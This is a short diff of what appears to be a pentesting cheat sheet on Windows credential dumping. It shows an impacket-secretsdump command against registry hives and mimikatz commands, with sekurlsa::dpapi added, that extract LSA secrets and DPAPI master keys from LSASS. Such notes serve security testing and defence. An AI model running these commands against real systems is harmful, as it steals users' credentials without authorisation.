@@ -188,7 +188,6 @@ $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive
 [![dpapi_extracting_passwords](../../../cybersecurity/_badges/hacktricks/windows_hardening/windows_local_privilege_escalation/dpapi_extracting_passwords.svg)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
 
 ...
-
 </div><div>
 
 #### Dump Credentials From The Credential Manager
@@ -220,6 +219,7 @@ The LSASS process that contains the DPAPI masterkey for the logged user. It can 
 
 ```shell!
 mimikatz# lsadump::lsa /patch
+mimikatz# sekurlsa::dpapi
 ```
 
 * **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>
